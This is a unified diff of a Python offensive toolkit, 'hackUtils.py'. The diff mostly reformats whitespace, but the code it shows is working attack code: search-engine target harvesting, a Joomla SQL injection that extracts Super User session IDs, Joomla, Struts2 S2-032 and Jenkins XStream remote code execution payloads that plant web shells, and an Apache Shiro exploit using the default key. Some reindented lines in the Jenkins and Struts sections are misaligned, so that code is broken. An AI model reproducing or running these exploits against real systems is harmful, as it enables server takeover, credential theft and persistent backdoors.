@@ -60,16 +60,16 @@ def isExisted(mystr,filepath):
 def getUrlRespHtml(url):
     respHtml=''
     try:
-        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
-                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7', 
-                'Accept-Language':'zh-cn,zh;q=0.5', 
-                'Cache-Control':'max-age=0', 
-                'Connection':'keep-alive', 
+        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7',
+                'Accept-Language':'zh-cn,zh;q=0.5',
+                'Cache-Control':'max-age=0',
+                'Connection':'keep-alive',
                 'Keep-Alive':'115',
                 'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
-     
+
         opener = urllib2.build_opener(urllib2.HTTPCookieProcessor())
-        urllib2.install_opener(opener) 
+        urllib2.install_opener(opener)
         req = urllib2.Request(url)
         opener.addheaders = heads.items()
         respHtml = opener.open(req).read()
@@ -80,15 +80,15 @@ def getUrlRespHtml(url):
 def getUrlRespHtmlByProxy(url,proxy):
     respHtml=''
     try:
-        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8', 
-                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7', 
-                'Accept-Language':'zh-cn,zh;q=0.5', 
-                'Cache-Control':'max-age=0', 
-                'Connection':'keep-alive', 
+        heads = {'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+                'Accept-Charset':'GB2312,utf-8;q=0.7,*;q=0.7',
+                'Accept-Language':'zh-cn,zh;q=0.5',
+                'Cache-Control':'max-age=0',
+                'Connection':'keep-alive',
                 'Keep-Alive':'115',
                 'User-Agent':'Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.14) Gecko/20110221 Ubuntu/10.10 (maverick) Firefox/3.6.14'}
         opener = urllib2.build_opener(urllib2.ProxyHandler({'https':proxy}))
-        urllib2.install_opener(opener) 
+        urllib2.install_opener(opener)
         req = urllib2.Request(url)
         opener.addheaders = heads.items()
         respHtml = opener.open(req).read()
@@ -96,7 +96,7 @@ def getUrlRespHtmlByProxy(url,proxy):
         pass
     return respHtml
 
-def getLinksFromBaidu(html):  
+def getLinksFromBaidu(html):
     soup = BeautifulSoup(html)
     html=soup.find('div', id="results")
     if not html:
@@ -122,7 +122,7 @@ def getLinksFromBaidu(html):
                 except Exception:
                     pass
 
-def getUrlsFromBaidu(html):  
+def getUrlsFromBaidu(html):
     soup = BeautifulSoup(html)
     html=soup.find('div', id="results")
     if not html:
@@ -186,7 +186,7 @@ def getLinksFromGoogle(html,wd):
             now = time.strftime('%H:%M:%S',time.localtime(time.time()))
             print "["+str(now)+"] [WARNING] failed to crawl"
 
-def getDomainsFromBaidu(html):  
+def getDomainsFromBaidu(html):
     soup = BeautifulSoup(html)
     html=soup.find('div', id="results")
     if not html:
@@ -212,7 +212,7 @@ def getDomainsFromBaidu(html):
                 except Exception:
                     pass
 
-def getLinksFromWooyun(html):  
+def getLinksFromWooyun(html):
     soup = BeautifulSoup(html)
     soup = soup.find('div', class_="content")
     soup = soup.find('table',class_="listTable")
@@ -263,7 +263,7 @@ def fetchUrls(se,wd,pg):
         if not os.path.exists(proxyini):
             print "[INFO] Please configure a proxy to access to Google..."
             proxyserver=raw_input('[+] Enter proxy server (e.g. 192.95.4.120:8888): ')
-            user=raw_input('[+] Enter user name [press Enter if anonymous]: ') 
+            user=raw_input('[+] Enter user name [press Enter if anonymous]: ')
             passwd=raw_input('[+] Enter password [press Enter if anonymous]: ')
             config.add_section("Proxy")
             config.set("Proxy","user",user)
@@ -302,7 +302,7 @@ def fetchUrls(se,wd,pg):
         for link in links:
             site = link.split("//")[1]
             if "www." in site:
-                site=site.split("www.")[1]  
+                site=site.split("www.")[1]
             kwd=wd.strip()+" "+"site:"+site.strip()
             kwd=urllib.quote(kwd)
             print "\n[INFO] Scanned Site: "+site.strip()
@@ -347,25 +347,25 @@ def encryptStr(value):
     print "[*] SHA1: "+sha1
     print "[*] SHA256: "+sha256
     print "[*] Base64: "+b64
-    
+
 def checkJoomla(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Checking Joomla 3.2.0 - 3.4.4 history.php SQLi..."
     if 'http://' in value or 'https://' in value:
-    	url=value
-    	checkJoomlaSQLi(url)
+        url=value
+        checkJoomlaSQLi(url)
     else:
-    	urlfile=open(value,'r')
-    	for url in urlfile:
+        urlfile=open(value,'r')
+        for url in urlfile:
             if url.strip():
                 checkJoomlaSQLi(url)
-    	urlfile.close()
+        urlfile.close()
     output = os.path.dirname(os.path.realpath(__file__))+"/joomla_vuls.txt"
     if os.path.exists(output):
         print "\n[INFO] Scanned Vuls:"
         print "[*] Output File: "+output
-    
-def checkJoomlaSQLi(url):    
+
+def checkJoomlaSQLi(url):
     url = url.strip()
     poc = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select 0x6176666973686572),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+poc
@@ -395,14 +395,14 @@ def getInfoByJoomlaSQLi(url, param):
         payload = "/index.php?option=com_contenthistory&view=history&list[ordering]=&item_id=1&type_id=1&list[select]=(select 1 from (select count(*),concat((select (select concat(session_id)) FROM %23__session WHERE data LIKE '%Super User%' AND data NOT LIKE '%IS NOT NULL%' AND userid!='0' AND username IS NOT NULL LIMIT 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)"
     urlA=url+payload
     try:
-	result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
+        result = requests.get(urlA,timeout=10,allow_redirects=True,verify=False).content
         if "Duplicate entry '" in result:
-	    reg = ".*Duplicate entry \'(.*?)1\'.*"
-	elif "Duplicate entry &#039" in result:	
-	    reg = ".*Duplicate entry \&\#039;(.*?)1\&\#039;.*"
+            reg = ".*Duplicate entry \'(.*?)1\'.*"
+        elif "Duplicate entry &#039" in result:
+            reg = ".*Duplicate entry \&\#039;(.*?)1\&\#039;.*"
         match_url = re.search(reg,result)
-	if match_url:
-	   info=match_url.group(1)
+        if match_url:
+            info=match_url.group(1)
         return info
     except Exception,e:
         return 'no info!'
@@ -411,20 +411,20 @@ def rceJoomla(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Checking Joomla 1.5 - 3.4.5 Remote Code Execution..."
     if 'http://' in value or 'https://' in value:
-    	url=value
-    	checkJoomlaRCE(url)
+        url=value
+        checkJoomlaRCE(url)
     else:
-    	urlfile=open(value,'r')
-    	for url in urlfile:
+        urlfile=open(value,'r')
+        for url in urlfile:
             if url.strip():
                 checkJoomlaRCE(url)
-    	urlfile.close()
+        urlfile.close()
     output = os.path.dirname(os.path.realpath(__file__))+"/joomla_rce.txt"
     if os.path.exists(output):
         print "\n[INFO] Scanned Vuls:"
         print "[*] Output File: "+output
 
-def checkJoomlaRCE(url):    
+def checkJoomlaRCE(url):
     url = url.strip()
     reg = 'http[s]*://.*/$'
     m = re.match(reg,url)
@@ -446,28 +446,28 @@ def checkJoomlaRCE(url):
     except Exception,e:
         print '[!] connection failed! url: '+url
 
-def get_url(url, user_agent): 
+def get_url(url, user_agent):
     headers = {
-    'User-Agent': user_agent
-    }
+            'User-Agent': user_agent
+            }
     cookies = requests.get(url,headers=headers).cookies
     for _ in range(3):
-        response = requests.get(url, timeout=10, headers=headers, cookies=cookies)    
+        response = requests.get(url, timeout=10, headers=headers, cookies=cookies)
     return response.content
-   
+
 def php_str_noquotes(data):
     "Convert string to chr(xx).chr(xx) for use in php"
     encoded = ""
     for char in data:
         encoded += "chr({0}).".format(ord(char))
     return encoded[:-1]
- 
+
 def generate_payload(php_payload):
     php_payload = "eval({0})".format(php_str_noquotes(php_payload))
 
     terminate = '\xf0\xfd\xfd\xfd';
     exploit_template = r'''}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\0\0\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";'''
-    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)    
+    injected_payload = "{};JFactory::getConfig();exit".format(php_payload)
     exploit_template += r'''s:{0}:"{1}"'''.format(str(len(injected_payload)), injected_payload)
     exploit_template += r''';s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\0\0\0connection";b:1;}''' + terminate
 
@@ -476,13 +476,13 @@ def generate_payload(php_payload):
 def getInfoByJoomlaRCE(result, param):
     if "System" in param:
         reg = '.*<tr><td class="e">System </td><td class="v">([^<>]*?)</td></tr>.*'
-    elif "DOCUMENT_ROOT" in param:	
+    elif "DOCUMENT_ROOT" in param:
         reg = '.*<tr><td class="e">_SERVER\["DOCUMENT_ROOT"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     elif "SCRIPT_FILENAME" in param:
         reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     match_url = re.search(reg,result)
     if match_url:
-       info=match_url.group(1)
+        info=match_url.group(1)
     else:
         info = 'no info!'
     return info
@@ -493,7 +493,7 @@ def getShellByJoomlaRCE(url, system, script_filename):
             shell = script_filename.split('index.php')[0].replace('/','//').strip()+"images//1ndex.php"
         else:
             shell = script_filename.split('index.php')[0]+"images/1ndex.php"
-        #yijuhua = "<?php eval($_POST[1]);?>" 
+        #yijuhua = "<?php eval($_POST[1]);?>"
         cmd ="file_put_contents('"+shell+"',base64_decode('PD9waHAgaWYoISRfUE9TVFsnaGFuZGxlJ10pe2hlYWRlcignSFRUUC8xLjEgNDA0IE5vdCBGb3VuZCcpOyBleGl0KCk7IH1lbHNleyAkcz0icCIuInIiLiJlIi4iZyIuIl8iLiJyIi4iZSIuInAiLiJsIi4iYSIuImMiLiJlIjsgJHMoIn5bZGlzY3V6XX5lIiwkX1BPU1RbJ2hhbmRsZSddLCJBY2Nlc3MiKTsgfSA/Pg=='));"
         pl = generate_payload(cmd)
         try:
@@ -508,20 +508,20 @@ def rceFeiFeiCMS(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Checking FeiFeiCMS 2.8 Remote Code Execution..."
     if 'http://' in value or 'https://' in value:
-    	url=value
-    	checkFeiFeiCMS(url)
+        url=value
+        checkFeiFeiCMS(url)
     else:
-    	urlfile=open(value,'r')
-    	for url in urlfile:
+        urlfile=open(value,'r')
+        for url in urlfile:
             if url.strip():
                 checkFeiFeiCMS(url)
-    	urlfile.close()
+        urlfile.close()
     output = os.path.dirname(os.path.realpath(__file__))+"/feifeicms_rce.txt"
     if os.path.exists(output):
         print "\n[INFO] Scanned Vuls:"
         print "[*] Output File: "+output
 
-def checkFeiFeiCMS(url):    
+def checkFeiFeiCMS(url):
     url = url.strip()
     reg = 'http[s]*://.*/$'
     m = re.match(reg,url)
@@ -547,7 +547,7 @@ def checkFeiFeiCMS(url):
 
 def exploitFeiFeiCMS(p1, p2):
     requests.get(p1, timeout=10)
-    response = requests.get(p2, timeout=10) 
+    response = requests.get(p2, timeout=10)
     return response.content
 
 def getInfoByFeiFeiCMS(result, param):
@@ -559,7 +559,7 @@ def getInfoByFeiFeiCMS(result, param):
         reg = '.*<tr><td class="e">_SERVER\["SCRIPT_FILENAME"\]</td><td class="v">([^<>]*?)</td></tr>.*'
     match_url = re.search(reg,result)
     if match_url:
-       info=match_url.group(1)
+        info=match_url.group(1)
     else:
         info = 'no info!'
     return info
@@ -587,22 +587,22 @@ def fetchCensys(value,field,page):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Fetching IPs/URLs from Censys..."
     for i in range(1,page):
-        data = {                                           
-             "query":value, 
-             "page":int(i), 
-             "fields":[field]
-            }
-	if field == "ip":
-	   res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET)).text
-	elif field == "domain":
-	   res = requests.post(API_URL + "/search/websites", data=json.dumps(data), auth=(UID, SECRET)).text
+        data = {
+                "query":value,
+                "page":int(i),
+                "fields":[field]
+                }
+        if field == "ip":
+            res = requests.post(API_URL + "/search/ipv4", data=json.dumps(data), auth=(UID, SECRET)).text
+        elif field == "domain":
+            res = requests.post(API_URL + "/search/websites", data=json.dumps(data), auth=(UID, SECRET)).text
         try:
             results = json.loads(res)
             for result in results["results"]:
                 censys=result[field]
                 mynow = time.strftime('%H:%M:%S',time.localtime(time.time()))
-		if field == "domain":
-		   censys = "http://"+censys
+                if field == "domain":
+                    censys = "http://"+censys
                 logfile(censys,'censys.txt')
                 print "["+str(mynow)+"] [INFO] "+censys
         except Exception:
@@ -623,10 +623,10 @@ def rceXStreamJenkins(value):
     print "["+str(now)+"] [INFO] Checking XStream (Jenkins CVE-2016-0792) Remote Code Execution..."
     if os.path.exists(value_ip.strip()):
         ipfile=open(value_ip,'r')
-    	for ip in ipfile:
+        for ip in ipfile:
             if ip.strip():
                 checkXStreamJenkins(ip, value_cmdstr)
-    	ipfile.close()
+        ipfile.close()
     else:
         checkXStreamJenkins(value_ip, value_cmdstr)
     output = os.path.dirname(os.path.realpath(__file__))+"/jenkins.txt"
@@ -653,18 +653,18 @@ def checkXStreamJenkins(ip, cmdstr):
     else:
         print '[!] connection failed! ip: '+ip
 
-def exploitXStreamJenkins(job_url, cmdstr, ver):  
+def exploitXStreamJenkins(job_url, cmdstr, ver):
     command = ""
     if cmdstr == "":
         command = "<string>dir</string>"
     else:
         cmd = cmdstr.split(" ")
         for str in cmd:
-            command += "<string>" + str + "</string>" 
+            command += "<string>" + str + "</string>"
     payload = "<map><entry><groovy.util.Expando><expandoProperties><entry><string>hashCode</string><org.codehaus.groovy.runtime.MethodClosure><delegate class=\"groovy.util.Expando\" reference=\"../../../..\"/><owner class=\"java.lang.ProcessBuilder\"><command>"+command+"</command><redirectErrorStream>false</redirectErrorStream></owner><resolveStrategy>0</resolveStrategy><directive>0</directive><parameterTypes/><maximumNumberOfParameters>0</maximumNumberOfParameters><method>start</method></org.codehaus.groovy.runtime.MethodClosure></entry></expandoProperties></groovy.util.Expando><int>1</int></entry></map>"
 
     try:
-    	headers = {'content-type': 'application/xml'}
+        headers = {'content-type': 'application/xml'}
         res = requests.post(job_url,timeout=10,data=payload,headers=headers)
         if res.status_code == 500:
             html = res.content
@@ -672,7 +672,7 @@ def exploitXStreamJenkins(job_url, cmdstr, ver):
                 reg = '.*java.io.IOException: Unable to read([^<>]*?)at hudson\.XmlFile\.*'
                 match = re.search(reg,html)
                 if match:
-                   job_path=match.group(1).strip()
+                    job_path=match.group(1).strip()
                    if ":" in job_path:
                        system = "Windows"
                    else:
@@ -680,8 +680,8 @@ def exploitXStreamJenkins(job_url, cmdstr, ver):
                    vul= "[+] vuls found! url: "+job_url+", system: "+system+", version: "+ver+", job_path: "+job_path
                    logfile(vul,'jenkins.txt')
                    print vul
-                else:
-                    print '[!] exploit failed! job_url: '+job_url
+               else:
+                   print '[!] exploit failed! job_url: '+job_url
             else:
                 print '[!] exploit failed! job_url: '+job_url
         else:
@@ -717,7 +717,7 @@ def getJobFromJenkins(html):
         soup = BeautifulSoup(html)
         html=soup.find('div', class_="dashboard")
         html_doc=html.find('table', id="projectstatus")
-	href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
+        href=html_doc.find_all('a', class_="model-link inside")[0].get('href')
         if href:
             return href
         else:
@@ -729,7 +729,7 @@ def getJenkinsVersion(html):
     try:
         soup = BeautifulSoup(html)
         html_doc=soup.find('span', class_="jenkins_ver")
-	ver=html_doc.find('a').find_all(text=True)[0]
+        ver=html_doc.find('a').find_all(text=True)[0]
         if ver:
             return str(ver)
         else:
@@ -741,20 +741,20 @@ def rceStruts2S2032(value):
     now = time.strftime('%H:%M:%S',time.localtime(time.time()))
     print "["+str(now)+"] [INFO] Checking Struts2 (S2-032) Remote Code Execution..."
     if 'http://' in value or 'https://' in value:
-    	url=value
-    	checkS2032(url)
+        url=value
+        checkS2032(url)
     else:
-    	urlfile=open(value,'r')
-    	for url in urlfile:
+        urlfile=open(value,'r')
+        for url in urlfile:
             if url.strip():
                 checkS2032(url)
-    	urlfile.close()
+        urlfile.close()
     output = os.path.dirname(os.path.realpath(__file__))+"/s2032_rce.txt"
     if os.path.exists(output):
         print "\n[INFO] Scanned Vuls:"
         print "[*] Output File: "+output
 
-def checkS2032(url):    
+def checkS2032(url):
     url = url.strip()
     if '?' in url:
         url = url.split('?')[0]
@@ -762,7 +762,7 @@ def checkS2032(url):
     poc = url+"?method:%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%2c%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%23parameters.command[0]%29.getInputStream%28%29%2c%23b%3dnew%20java.io.InputStreamReader%28%23a%29%2c%23c%3dnew%20java.io.BufferedReader%28%23b%29%2c%23d%3dnew%20char[51020]%2c%23c.read%28%23d%29%2c%23kxlzx%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23kxlzx.println%28%23d%29%2c%23kxlzx.close&command=netstat"
     poc_root_path = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23path%3d%23req.getRealPath(%23parameters.pp[0]),%23w%3d%23res.getWriter(),%23w.print(%23path),1?%23xx:%23request.toString&pp=%2f&encoding=UTF-8"
     poc_whoami = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=whoami&pp=A&ppp=%20&encoding=UTF-8"
-		
+
     shellname="nimabi.jsp"
     shellpwd="nmb"
     #shellcontent_win="%3C%25%20if%28request.getParameter%28%22"+shellpwd+"%22%29%21%3Dnull%29%28new%20java.io.FileOutputStream%28application.getRealPath%28%22%2f%22%29%2brequest.getParameter%28%22"+shellpwd+"%22%29%29%29.write%28request.getParameter%28%22t%22%29.getBytes%28%29%29%3B%20%25%3E"
@@ -774,20 +774,20 @@ def checkS2032(url):
         result = exploitS2032(poc)
         if "Local Address" in result:
             try:
-            	root_path = exploitS2032(poc_root_path).strip()
-            	whoami = exploitS2032(poc_whoami).strip()
-            	if ":" in root_path:
-            		system = "Windows"
-            		exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_win+"&encoding=UTF-8&pp=%2f"
-            	else:
-            		system = "Linux"
-            		exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_linux+"&encoding=UTF-8&pp=%2f"
-            	shell_path = exploitS2032(exp).strip() + ' (pwd: '+shellpwd+', cmd: whoami)'
+                root_path = exploitS2032(poc_root_path).strip()
+                whoami = exploitS2032(poc_whoami).strip()
+                if ":" in root_path:
+                    system = "Windows"
+                        exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_win+"&encoding=UTF-8&pp=%2f"
+                else:
+                    system = "Linux"
+                        exp = url+"?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23req%3d%40org.apache.struts2.ServletActionContext%40getRequest(),%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23path%3d%23req.getRealPath(%23parameters.pp[0]),new%20java.io.BufferedWriter(new%20java.io.FileWriter(%23path%2b%23parameters.shellname[0]).append(%23parameters.shellContent[0])).close(),%23w.print(%23path%2b%23parameters.shellname[0]),%23w.close(),1?%23xx:%23request.toString&shellname="+shellname+"&shellContent="+shellcontent_linux+"&encoding=UTF-8&pp=%2f"
+                shell_path = exploitS2032(exp).strip() + ' (pwd: '+shellpwd+', cmd: whoami)'
             except Exception, e:
-            	root_path = "unknown"
-            	whoami = "unknown"
-            	shell_path = "unknown"
-            	system = "unknown"
+                root_path = "unknown"
+                whoami = "unknown"
+                shell_path = "unknown"
+                system = "unknown"
             vuls='[+] vuls found! url: '+url+', system: '+ system +', whoami: '+whoami+', root_path: '+root_path+', shell_path: '+shell_path
             logfile(vuls,'s2032_rce.txt')
             print vuls
@@ -797,9 +797,9 @@ def checkS2032(url):
         print '[!] connection failed! url: '+url
 
 def exploitS2032(exp):
-    response = requests.get(exp, timeout=10) 
+    response = requests.get(exp, timeout=10)
     return response.content
-    
+
 def rceApacheShiro(value):
     value_url = value.strip().split("::")[0]
     if len(value.strip().split("::"))>1:
@@ -847,9 +847,9 @@ def exploitApacheShiro(url,cmdstr):
     key = base64.b64decode('kPH+bIxk5D2deZiIxcaaaA==') # Default AES Key for shiro 1.2.4
     payload = generateApacheShiroPayload(cmdstr)
     headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) '
-                             'Chrome/45.0.2454.101 Safari/537.36',
-               'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
-               'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
+            'Chrome/45.0.2454.101 Safari/537.36',
+            'Cookie': 'rememberMe=%s' % shiroAesEncryption(key, open(payload, 'rb').read()),
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8'}
     conn = requests.get(url, timeout=10, verify=False, headers=headers)
     status_conn = conn.status_code
     if os.path.exists(os.path.dirname(os.path.realpath(__file__))+"/"+payload):
@@ -880,12 +880,12 @@ def generateApacheShiroPayload(cmdstr):
 
 def myhelp():
     print '''
-     _                _    _   _ _   _ _             _____  _____  
-    | |              | |  | | | | | (_) |           |  _  |/ __  \ 
-    | |__   __ _  ___| | _| | | | |_ _| |___  __   _| |/' |`' / /' 
-    | '_ \ / _` |/ __| |/ / | | | __| | / __| \ \ / /  /| |  / /   
-    | | | | (_| | (__|   <| |_| | |_| | \__ \  \ V /\ |_/ /./ /___ 
-    |_| |_|\__,_|\___|_|\_\\\\___/ \__|_|_|___/   \_/  \___(_)_____/                                                                                                                                                                                                                                                                 
+     _                _    _   _ _   _ _             _____  _____
+    | |              | |  | | | | | (_) |           |  _  |/ __  \
+            | |__   __ _  ___| | _| | | | |_ _| |___  __   _| |/' |`' / /'
+    | '_ \ / _` |/ __| |/ / | | | __| | / __| \ \ / /  /| |  / /
+    | | | | (_| | (__|   <| |_| | |_| | \__ \  \ V /\ |_/ /./ /___
+    |_| |_|\__,_|\___|_|\_\\\\___/ \__|_|_|___/   \_/  \___(_)_____/
     '''
     print "Usage: hackUtils.py [options]\n"
     print "Options:"
